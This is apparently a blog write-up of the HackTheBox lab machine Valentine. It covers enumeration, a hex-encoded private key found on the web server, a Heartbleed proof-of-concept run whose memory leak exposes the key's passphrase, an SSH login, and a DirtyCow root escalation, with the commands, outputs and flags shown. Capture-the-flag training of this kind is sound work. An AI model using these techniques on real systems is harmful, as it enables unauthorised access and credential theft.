---
layout: post
title: "Valentine Writeup - HackTheBox"
category: HackTheBox
---

# HTB lab Machine - Valentine

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.155.67 folder that I have attached to this post.

## Enumeration summary

```
[-] [10.129.155.61 tcp/22/nmap-ssh] PORT   STATE SERVICE REASON         VERSION
[-] [10.129.155.61 tcp/22/nmap-ssh] 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
[-] [10.129.155.61 tcp/22/nmap-ssh] |_banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10
[-] [10.129.155.61 tcp/22/nmap-ssh] | ssh-auth-methods:
[-] [10.129.155.61 tcp/22/nmap-ssh] |   Supported authentication methods:
[-] [10.129.155.61 tcp/22/nmap-ssh] |     publickey
[-] [10.129.155.61 tcp/22/nmap-ssh] |_    password

```

```
php, pl, sh, asp, html, json, py, cfm, aspx, rb, cgi
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
http://10.129.155.67
```

![image-20210601160528713.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210601160528713.png)

```
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d

```

![image-20210601160704262.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210601160704262.png)

Lol where is that damn decoder. Seems like hex

```
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-02-06T00:45:25
| Not valid after:  2019-02-06T00:45:25
| MD5:   a413 c4f0 b145 2154 fb54 b2de c7a9 809d
|_SHA-1: 2303 80da 60e7 bde7 2ba6 76dd 5214 3c3c 6f53 01b1
|_ssl-date: 2021-06-01T13:03:05+00:00; +1s from scanner time.
```

```
| vulners:
|   cpe:/a:openbsd:openssh:5.9p1:
|       EDB-ID:21018    10.0    https://vulners.com/exploitdb/EDB-ID:21018  *EXPLOIT*
|       CVE-2001-0554   10.0    https://vulners.com/cve/CVE-2001-0554
|       EDB-ID:40888    7.8 https://vulners.com/exploitdb/EDB-ID:40888  *EXPLOIT*
|       CVE-2016-6244   7.8 https://vulners.com/cve/CVE-2016-6244
|       EDB-ID:41173    7.2 https://vulners.com/exploitdb/EDB-ID:41173  *EXPLOIT*
|       CVE-2016-6241   7.2 https://vulners.com/cve/CVE-2016-6241
```

```
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /dev/: Directory indexing found.
+ OSVDB-3092: /dev/: This might be interesting...

```

```
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php

```

![image-20210601165927063.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210601165927063.png)

## Exploitation

Seems like hex indeed, we’ve got online decoders for this:

![image-20210601160821372.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210601160821372.png)

Lol we are gonna SSH into this box using a private key that was hosted on the webserver.

Create a file called idrsa and do this:

```
chmod 600 idrsa
ssh -i idrsa root@10.129.155.67
```

Fuck, I need a passphrase:

```
┌──(kali㉿kali)-[~/Desktop/DownloadedScripts]
└─$ ssh -i idrsa root@10.129.155.67                                                                                                                                                                                                      255 ⨯
The authenticity of host '10.129.155.67 (10.129.155.67)' can't be established.
ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.155.67' (ECDSA) to the list of known hosts.
dir
Enter passphrase for key 'idrsa':

```

Still have these websites tho:

![image-20210601161231458.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210601161231458.png)

I can upload stuff in that PHP page. It seems like its a base64 encoder/decoder. But idk, does not seem like the solution. I rather focussed on heartblead for a while, since the homepage of the webserver seems to drop a hint to heartblead. So I found this:https://github.com/mpgn/heartbleed-PoC

Tried it:

```
┌──(kali㉿kali)-[~/Desktop/DownloadedScripts/heartbleed-PoC]
└─$ python heartbleed-exploit.py 10.129.155.67                                                                                                                                                                                             1 ⨯
Connecting...
Sending Client Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Handshake done...
Sending heartbeat request with length 4 :
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response in file out.txt
WARNING : server returned more data than it should - server is vulnerable!

┌──(kali㉿kali)-[~/Desktop/DownloadedScripts/heartbleed-PoC]
└─$ dir
heartbleed-exploit.py  out.txt  README.md  utils

┌──(kali㉿kali)-[~/Desktop/DownloadedScripts/heartbleed-PoC]
└─$ cat out.txt
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 65 63 74 69  ....#.......ecti
  00e0: 6F 6E 3A 20 4B 65 65 70 2D 41 6C 69 76 65 0D 0A  on: Keep-Alive..
  00f0: 0D 0A 3C 73 63 72 69 70 74 3E 61 6C 65 72 74 28  ..<script>alert(
  0100: 27 58 53 53 27 29 3C 2F 73 63 72 69 70 74 3E 5B  'XSS')</script>[
  0110: 5D 3D 50 41 54 48 20 44 49 53 43 4C 4F 53 55 52  ]=PATH DISCLOSUR
  0120: 45 C5 63 18 08 78 9A F4 A4 F8 51 A6 E4 C2 D9 CE  E.c..x....Q.....
  0130: AD 01 00 33 00 26 00 24 00 1D 00 20 3C 72 A5 60  ...3.&.$... <r.`
  0140: D7 7E 50 29 2F A0 6D C0 AD C2 41 5A 68 C4 CA DE  .~P)/.m...AZh...
  0150: A3 0A FB BD 12 04 63 13 2D 82 5F 3D 00 15 00 A0  ......c.-._=....
  0160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  01a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  01b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  01c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  01d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  01e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  01f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0200: 77 77 2D 66 6F 72 6D 2D 75 72 6C 65 6E 63 6F 64  ww-form-urlencod
  0210: 65 64 0D 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20  ed..Connection:
  0220: 4B 65 65 70 2D 41 6C 69 76 65 0D 0A 0D 0A 74 72  Keep-Alive....tr
  0230: 61 6E 73 61 63 74 69 6F 6E 5F 69 64 3D 31 26 6F  ansaction_id=1&o
  0240: 61 75 74 68 5F 74 6F 6B 65 6E 3D 27 25 33 62 65  auth_token='%3be
  0250: 63 68 6F 20 27 D1 5E 1C 47 41 22 EA 8F 88 3F A8  cho '.^.GA"...?.
  0260: 67 66 48 1F 9D 67 3E 6F 70 65 72 61 74 69 6F 6E  gfH..g>operation
  0270: 3C 2F 73 74 72 69 6E 67 3E 3C 73 74 72 69 6E 67  </string><string
  0280: 3E 74 69 6D 65 73 74 61 6D 70 3C 2F 73 74 72 69  >timestamp</stri
  0290: 6E 67 3E 3C 73 74 72 69 6E 67 3E 74 69 6D 65 54  ng><string>timeT
  02a0: 6F 4C 69 76 65 3C 2F 73 74 72 69 6E 67 3E 3C 2F  oLive</string></
  02b0: 74 72 61 69 74 73 3E 3C 6F 62 6A 65 63 74 3E 3C  traits><object><
  02c0: 74 72 61 69 74 73 2F 3E 3C 2F 6F 62 6A 65 63 74  traits/></object
  02d0: 3E 3C 6E 75 6C 6C 2F 3E 3C 73 74 72 69 6E 67 2F  ><null/><string/
  02e0: 3E 3C 73 74 72 69 6E 67 2F 3E 3C 6F 62 6A 65 63  ><string/><objec
  02f0: 74 3E 3C 74 72 61 69 74 73 3E 3C 73 74 72 69 6E  t><traits><strin
  0300: 67 3E 44 53 49 64 3C 2F 73 74 72 69 6E 67 3E 3C  g>DSId</string><
  0310: 73 74 72 69 6E 67 3E 44 53 4D 65 73 73 61 67 69  string>DSMessagi
  0320: 6E 67 56 65 72 73 69 6F 6E 3C 2F 73 74 72 69 6E  ngVersion</strin
  0330: 67 3E 3C 2F 74 72 61 69 74 73 3E 3C 73 74 72 69  g></traits><stri
  0340: 6E 67 3E 6E 69 6C 3C 2F 73 74 72 69 6E 67 3E 3C  ng>nil</string><
  0350: 69 6E 74 3E 31 3C 2F 69 6E 74 3E 3C 2F 6F 62 6A  int>1</int></obj
  0360: 65 63 74 3E 3C 73 74 72 69 6E 67 3E 26 78 78 65  ect><string>&xxe
  0370: 3B 3C 2F 73 74 72 69 6E 67 3E 3C 69 6E 74 3E 35  ;</string><int>5
  0380: 3C 2F 69 6E 74 3E 3C 69 6E 74 3E 30 3C 2F 69 6E  </int><int>0</in
  0390: 74 3E 3C 69 6E 74 3E 30 3C 2F 69 6E 74 3E 3C 2F  t><int>0</int></
  03a0: 6F 62 6A 65 63 74 3E 3C 2F 62 6F 64 79 3E 3C 2F  object></body></
  03b0: 61 6D 66 78 3E 51 CE 0A 9E EB 25 B9 FB B3 4D FB  amfx>Q....%...M.
  03c0: 76 94 EF 78 A5 00 00 00 00 00 00 00 00 00 00 00  v..x............
  03d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  .............
```

Okay so that works, now lets try and run decode.php and run heartblead again:

```
00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D F3  mV0aGVoeXBlCg==.
  0160: CE FC E5 62 29 E3 4A 7F 26 12 26 2C AA C9 E7 FE  ...b).J.&.&,....
  0170: BA D1 51 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ..Q.............

```

That text variable: aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== equals heartbleedbelievethehype in base64. Easy game, maybe thats the passphrase. By the way I think the user is hype because the file on the webbrowser is called hype_key. And because root did not work.

```
┌──(kali㉿kali)-[~/Desktop/DownloadedScripts]
└─$ ssh -i idrsa hype@10.129.155.67                                                                                                                                                                                                      130 ⨯
Enter passphrase for key 'idrsa':
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
hype@Valentine:~$ sudo -l
[sudo] password for hype:
Sorry, try again.
[sudo] password for hype:
sudo: 1 incorrect password attempt
hype@Valentine:~$ pwd
/home/hype
hype@Valentine:~$ dir
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
hype@Valentine:~$ cd Desktop
hype@Valentine:~/Desktop$ dir
user.txt
hype@Valentine:~/Desktop$ cat user.txt
e6710a5464769fd5fcd216e076961750
hype@Valentine:~/Desktop$

```

Lets go to privesc shall we, imma use this: https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

```
Available information:

Kernel version: 3.2.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 12.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

76 kernel space exploits
48 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: highly probable
   Tags: RHEL=6,[ ubuntu=12.04{kernel:3.2.0-(23|29)-generic} ],fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},debian=7{kernel:3.2.0-4-amd64}
   Download URL: https://www.exploit-db.com/download/26131
   Comments: No SMEP/SMAP bypass

[+] [CVE-2013-2094] perf_swevent 2

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: highly probable
   Tags: [ ubuntu=12.04{kernel:3.(2|5).0-(23|29)-generic} ]
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c
   Comments: No SMEP/SMAP bypass

```

Lets try dirtycow first: https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c

But this one did not work. So I tried cowroot2: https://www.exploit-db.com/exploits/40839

Just follow the steps that are commented in the script:

```
firefart@Valentine:~# cat root.txt
f1bb6d759df1f272914ebbc9ed7765b2
firefart@Valentine:~# whoami
firefart
firefart@Valentine:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@Valentine:~#

```

## Final thoughts

Easy 20 pointer.

